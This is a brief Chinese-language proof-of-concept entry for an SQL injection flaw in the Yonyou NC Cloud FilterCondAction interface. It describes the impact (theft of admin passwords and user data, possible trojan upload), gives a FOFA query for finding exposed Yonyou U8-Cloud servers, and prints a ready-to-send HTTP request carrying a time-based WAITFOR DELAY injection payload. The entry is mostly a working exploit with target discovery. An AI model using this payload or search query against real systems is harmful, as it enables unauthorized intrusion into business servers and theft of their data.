## 用友NC-Cloud-FilterCondAction-sql注入漏洞

## 一、漏洞简介
用友NC Cloud FilterCondAction 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
app="用友-U8-Cloud"
```

## POC
```
GET /service/-/iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
Host: example.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```
